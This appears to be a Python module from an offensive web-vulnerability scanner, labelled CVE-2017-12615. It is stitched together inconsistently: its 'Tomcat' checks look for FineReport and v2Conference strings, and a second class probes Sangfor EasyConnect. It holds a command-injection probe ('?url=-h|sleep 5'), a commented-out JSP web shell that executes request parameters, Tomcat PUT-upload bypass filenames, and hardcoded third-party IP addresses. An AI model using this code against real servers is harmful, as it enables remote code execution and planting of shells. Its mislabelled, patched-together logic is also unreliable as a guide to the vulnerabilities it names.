# coding:utf-8
# CVE-2017-12615.py

from colorama import Fore
from tqdm import tqdm

from exploit.web import BaseScript
from core.MyEnums import *
from core.MyAsyncHttp import *


class Script(BaseScript):
    name = 'Tomcat PUTFILE'

    def __init__(self, target, pbar):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bugLevel = BugLevel.HIGH
        # 类型
        self.bugType = BugType.UPLOADFILE
        # 编号
        self.bugNumber = 'CVE-2017-12615'
        # 来源
        self.refer = ''
        # 特定路径判断
        self.detectPathList = ['/Conf/images/user.gif']
        # exec
        self.execPathList = ['/Conf/jsp/systembulletin/bulletinAction.do']
        # 进度条
        self.pbar = pbar
        # 相关信息
        self.info = 'Version < 3000.2'

    async def detect(self):
        try:
            async with aiohttp.ClientSession() as session:
                for detectPath in self.detectPathList:
                    url = f'http://{self.target}{detectPath}' if self.target.startswith(
                        ('http:', 'https:')) is False else f'{self.target}{detectPath}'
                    async with session.get(url=url, timeout=10, verify_ssl=False) as response:
                        if response is not None:
                            text = await response.text()
                            await asyncio.sleep(2)
                            if 'FineReport--Web Reporting Tool' in text:
                                self.flag = True
                                tqdm.write(Fore.RED + '[{}] {}'.format('Tomcat Finger', url))
                                return {'name': 'v2Conference Finger', 'url': url, 'software': 'Tomcat'}
        except Exception:
            return None

    async def exec(self):
        try:
            async with aiohttp.ClientSession() as session:
                for execPath in self.execPathList:
                    url = f'http://{self.target}{execPath}' if self.target.startswith(
                        ('http:', 'https:')) is False else f'{self.target}{execPath}'
                    async with session.get(url=url, timeout=10, verify_ssl=False) as response:
                        if response is not None:
                            text = await response.text()
                            await asyncio.sleep(2)
                            if 'It works!' in text:
                                tqdm.write(Fore.RED + '[{}] {}'.format('Tomcat RCE', url))
                                return {'name': 'Tomcat RCE', 'url': url, 'software': 'Tomcat'}
        except Exception:
            return None

    async def attack(self, semaphore):
        async with semaphore:
            a = await self.detect()
            if a is not None:
                self.vulList.append(a)
            if self.flag:
                b = await self.exec()
                if b is not None:
                    self.vulList.append(b)
        self.pbar.update(1)
        return self.vulList


if __name__ == '__main__':
    import requests
    import hashlib
    resp = requests.get('https://50.84.113.154:8443/favicon.ico', verify=False)
    if resp.status_code == 200:
        m1 = hashlib.md5()
        m1.update(resp.content)
        theMD5 = m1.hexdigest()
        print(theMD5)

    # sem = asyncio.Semaphore(500)
    # sc = Script('61.150.65.205:9999', 1, sem)
    # l = asyncio.get_event_loop()
    # l.run_until_complete(sc.attack())


# CVE-2017-12615
class Detect(threading.Thread):
    name = 'CVE-2017-12615'

    def __init__(self, alive_Web_queue, pbar, vul_list, requests_proxies):
        threading.Thread.__init__(self)
        self.alive_Web_queue = alive_Web_queue  # 存活web的队列
        self.pbar = pbar  # 进度条
        self.vul_list = vul_list  # 存储漏洞的名字和url
        self.proxies = requests_proxies  # 代理
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.75 Safari/537.36"}

    def run(self):
        while not self.alive_Web_queue.empty():
            alive_web = self.alive_Web_queue.get()
            self.pbar.set_postfix(url=alive_web, vul=self.name)  # 进度条的显示
            self.run_detect(alive_web.rstrip('/'))
            self.pbar.update(1)  # 每完成一个任务，进度条也加+1
            self.alive_Web_queue.task_done()

    # 调用各种漏洞检测方法
    def run_detect(self, url):
        # 深信服rce1
        self.rce1(url)

    # 深信服rce1
    def rce1(self, url):
        # tqdm.write(Fore.WHITE + '[{}] curl {}'.format(self.alive_Web_queue.qsize(), url))
        image_url = url + '/com/images/ec-logo.png'
        rce_url = url + '/por/checkurl.csp'
        try:
            res = requests.get(url=rce_url, headers=self.headers, proxies=self.proxies, verify=False, timeout=30)
            if res.status_code == 200 and res.text == '2':
                tqdm.write(Fore.RED + '[EasyConnect] {}'.format(rce_url))
                self.vul_list.append(['EasyConnect', rce_url, 'Yes {}/?url=-h|sleep 5'.format(rce_url)])
        except Exception as e:
            return False

        try:
            res = requests.get(url=image_url, headers=self.headers, proxies=self.proxies, verify=False, timeout=10)
            if res.status_code == 200 and res.headers["Content-Type"] == 'image/png':
                tqdm.write(Fore.RED + '[EasyConnect] {}'.format(image_url))
                self.vul_list.append(['EasyConnect', image_url, 'Maybe'])
        except Exception as e:
            return False

        # headers = {
        #     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"}
        # data = """<%
        # if("cbd".equals(request.getParameter("zpchcbd"))){
        #     java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("zpchcbd")).getInputStream();
        #     int a = -1;
        #     byte[] b = new byte[2048];
        #     out.print("<pre>");
        #     while((a=in.read(b))!=-1){
        #         out.println(new String(b));
        #     }
        #     out.print("</pre>");
        # }
        # %>"""
        # code = ['zpchcbd.jsp.', 'zpchcbd.jsp/', 'zpchcbd.jsp::$DATA']
        # try:
        #     for i in range(2):
        #         requests.put(url + code[i], headers=headers, data=data)  # 发送put请求写入文件
        #         resp = requests.get(
        #             url + code[i][:-1], headers=headers)  # 发送get请求验证是否写入
        #         if resp.status_code == 200:
        #             print('写入文件成功,shell地址为 ' + url + code[0][:-1])
        #             exit()
        #     requests.put(url + code[2], headers=headers, data=data)
        #     resp1 = requests.get(url + code[2], headers=headers)
        #     if resp1.status_code == 200:
        #         print('写入文件成功,shell地址为 ' + url + code[2])
        #     print('Exploit结束')
        # except:
        #     "someone is error!!!"


if __name__ == '__main__':
    from queue import Queue

    alive_web = ['']
    vul_list = []
    # proxy = r''
    # requests_proxies = {"http": "socks5://{}".format(proxy), "https": "socks5://{}".format(proxy)}
    requests_proxies = None
    alive_Web_queue = Queue(-1)  # 将存活的web存入队列里
    for _ in alive_web:
        alive_Web_queue.put(_)

    threads = []
    thread_num = 1  # 漏洞检测的线程数目

    pbar = tqdm(total=alive_Web_queue.qsize(), desc="检测漏洞", ncols=100)  # total是总数

    for num in range(1, thread_num + 1):
        t = Detect(alive_Web_queue, pbar, vul_list, requests_proxies)  # 实例化漏洞类，传递参数：存活web的队列，  存储漏洞的列表
        threads.append(t)
        t.start()
    for t in threads:
        t.join()

    tqdm.write(Fore.BLACK + '-' * 50 + '结果' + '-' * 50)
    for vul in vul_list:
        tqdm.write(Fore.BLACK + str(vul))